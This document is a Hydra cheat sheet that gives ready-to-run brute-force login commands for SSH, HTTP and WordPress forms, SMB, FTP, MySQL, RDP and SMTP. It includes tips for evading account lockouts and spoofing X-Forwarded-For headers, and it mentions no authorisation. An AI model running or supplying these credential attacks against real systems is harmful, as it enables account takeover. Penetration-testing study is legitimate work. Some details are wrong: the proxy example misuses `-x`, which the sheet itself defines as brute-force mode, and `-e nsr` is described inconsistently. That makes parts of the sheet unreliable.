# Hydra Cheat Sheet  
*Fast Network Login Cracker for Brute-Forcing Protocols*  

---

## **1. Core Concepts**  
- **Hydra**: Parallelized login cracker supporting 50+ protocols (SSH, HTTP, SMB, etc.).  
- **Service Module**: Protocol-specific rules for authentication (e.g., `ssh`, `http-post-form`).  
- **Wordlists**: Files like `rockyou.txt` or `SecLists` for usernames/passwords.  
- **Brute-Force**: Testing credential combinations systematically.  

---

## **2. Basic Syntax**  
```bash  
hydra [options] <IP> <service-module> [module-specific-parameters]  
```  

---

## **3. Essential Flags**  
| **Flag**          | **Description**                                      |  
|--------------------|------------------------------------------------------|  
| `-l <user>`       | Single username (e.g., `-l admin`)                   |  
| `-L <file>`       | Username wordlist (e.g., `-L users.txt`)             |  
| `-p <pass>`       | Single password (e.g., `-p Password123`)             |  
| `-P <file>`       | Password wordlist (e.g., `-P passwords.txt`)         |  
| `-s <port>`       | Custom port (e.g., `-s 8080` for non-standard HTTP)  |  
| `-t <threads>`    | Parallel tasks (default: 16; max: 64)                |  
| `-v` / `-V`       | Verbose mode (`-V` for real-time output)             |  
| `-f`              | Stop after first valid login                         |  
| `-e nsr`          | Test `n` (null), `s` (same as user), `r` (reverse)   |  
| `-w <sec>`        | Wait time between attempts (e.g., `-w 5`)            |  
| `-W <sec>`        | Per-host delay (e.g., `-W 2` to avoid lockouts)      |  
| `-R`              | Restore a previous session                           |  
| `-x <min:max:chars>` | Brute-force mode (e.g., `-x 6:8:a1d` for 6-8 chars) |  

---

## **4. Service Modules & Examples**  
*Format*: `<protocol>`: `[module-specific parameters]`  

### **SSH**  
**Module**: `ssh`  
```bash  
hydra -L users.txt -P passwords.txt 10.10.10.10 ssh -s 22 -t 64  
```  
**Notes**:  
- Use `-t` to increase threads for faster cracking.  

---

### **HTTP Form Login**  
**Module**: `http[s]-post-form`  
**Syntax**:  
```  
"/path:POST-data:F=Failure-string:S=Success-string"  
```  
**Example**:  
```bash  
hydra 10.10.10.10 http-post-form \  
"/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials" -L users.txt -P passwords.txt  
```  
**Notes**:  
- Use `:S=` to match success criteria (e.g., `S=302` for redirects).  
- Add headers with `-H "Cookie: session=xyz"`.  

---

### **SMB (Windows Shares)**  
**Module**: `smb`  
```bash  
hydra -L users.txt -P passwords.txt 10.10.10.10 smb -W 3  
```  
**Notes**:  
- Target specific shares: `smb://WORKGROUP\\C$`.  

---

### **FTP**  
**Module**: `ftp`  
```bash  
hydra -L users.txt -P passwords.txt ftp://10.10.10.10 -s 21 -V  
```  
**Anonymous Access**:  
```bash  
hydra -l anonymous -P "" ftp://10.10.10.10  
```  

---

### **MySQL**  
**Module**: `mysql`  
```bash  
hydra -L users.txt -P passwords.txt 10.10.10.10 mysql -t 32  
```  

---

### **RDP (Remote Desktop)**  
**Module**: `rdp`  
```bash  
hydra -L users.txt -P passwords.txt rdp://10.10.10.10 -V  
```  

---

### **SMTP**  
**Module**: `smtp`  
**Brute-force**:  
```bash  
hydra -L users.txt -P passwords.txt smtp://10.10.10.10  
```  
**Verify Emails (VRFY)**:  
```bash  
hydra -L users.txt smtp-vrfy://10.10.10.10  
```  

---

### **WordPress**  
**Module**: `http-form-post` (custom)  
```bash  
hydra -l admin -P rockyou.txt 10.10.10.10 http-form-post \  
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"  
```  

---

## **5. Advanced Techniques**  

### **Custom Headers & Proxies**  
```bash  
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \  
"/login:user=^USER^&pass=^PASS^:F=error" -H "X-Forwarded-For: 127.0.0.1" -x http://proxy:8080  
```  

### **Password Mutations**  
Test variations like `admin123` or `Admin123`:  
```bash  
hydra -l admin -P passwords.txt -e nsr 10.10.10.10 ssh  
```  

### **Resume Sessions**  
```bash  
hydra -R  
```  

---

## **6. Optimization & Safety**  

### **Avoid Lockouts**  
- Use `-w` and `-W` for delays:  
  ```bash  
  hydra -l admin -P passwords.txt -w 5 -W 2 10.10.10.10 ssh  
  ```  

### **Performance**  
- Increase threads: `-t 64`.  
- Use smaller, targeted wordlists first.  

### **Wordlists**  
```bash  
git clone https://github.com/danielmiessler/SecLists  # Comprehensive wordlists  
```  

---

## **7. Troubleshooting**  

| **Issue**                | **Solution**                                      |  
|--------------------------|---------------------------------------------------|  
| "Too many connections"   | Reduce threads (`-t 16`), add delays (`-w`/`-W`). |  
| "Invalid module"         | Check protocol syntax (e.g., `http-post-form`).   |  
| No results               | Verify failure strings match responses.           |  

---

## **9. References**  
- **Hydra GitHub**: https://github.com/vanhauser-thc/thc-hydra  
- **SecLists**: https://github.com/danielmiessler/SecLists  
